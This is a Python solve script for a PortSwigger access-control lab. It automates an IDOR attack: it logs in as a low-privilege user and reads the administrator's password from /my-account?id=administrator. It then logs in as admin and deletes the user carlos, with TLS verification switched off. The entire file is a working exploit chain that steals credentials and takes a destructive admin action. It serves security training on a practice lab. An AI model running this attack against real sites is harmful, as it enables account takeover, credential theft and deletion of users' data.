#!/usr/bin/env python3
"""
Solve script for PortSwigger Lab:
User ID controlled by request parameter with password disclosure.

Logs in as wiener, fetches /my-account?id=administrator to extract the
admin password from the HTML, then logs in as admin and deletes carlos.
"""

import argparse
import re
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def get_csrf(session: requests.Session, url: str) -> str:
    r = session.get(url)
    m = re.search(r'name="csrf" value="([^"]+)"', r.text)
    if not m:
        raise SystemExit("[-] CSRF token not found")
    return m.group(1)


def login(session: requests.Session, lab: str, username: str, password: str) -> None:
    csrf = get_csrf(session, f"{lab}/login")
    r = session.post(f"{lab}/login", data={"csrf": csrf, "username": username, "password": password})
    if "Invalid username or password" in r.text:
        raise SystemExit(f"[-] Login failed for {username}")
    print(f"[*] Logged in as {username}")


def extract_password(session: requests.Session, lab: str, target_id: str) -> str:
    r = session.get(f"{lab}/my-account", params={"id": target_id})
    m = re.search(r'type="password"[^>]*value="([^"]+)"', r.text)
    if not m:
        m = re.search(r'name="password"[^>]*value="([^"]+)"', r.text)
    if not m:
        raise SystemExit(f"[-] Could not extract password for id='{target_id}'")
    return m.group(1)


def main():
    parser = argparse.ArgumentParser(
        description="Solve Access Control Lab 8 (password disclosed via IDOR)"
    )
    parser.add_argument("lab_url", help="Lab base URL")
    parser.add_argument("--username", default="wiener")
    parser.add_argument("--password", default="peter")
    parser.add_argument("--admin-id", default="administrator")
    parser.add_argument("--target", default="carlos")
    args = parser.parse_args()

    lab = args.lab_url.rstrip("/")
    s = requests.Session()
    s.verify = False

    login(s, lab, args.username, args.password)

    print(f"[*] Fetching /my-account?id={args.admin_id}...")
    admin_password = extract_password(s, lab, args.admin_id)
    print(f"[+] Admin password: {admin_password}")

    # Re-login as admin (clear session first)
    s.cookies.clear()
    login(s, lab, args.admin_id, admin_password)

    r = s.get(f"{lab}/admin/delete?username={args.target}")
    if r.ok:
        print(f"[+] Deleted '{args.target}'. Lab solved.")
    else:
        print(f"[-] Delete returned {r.status_code}")


if __name__ == "__main__":
    main()
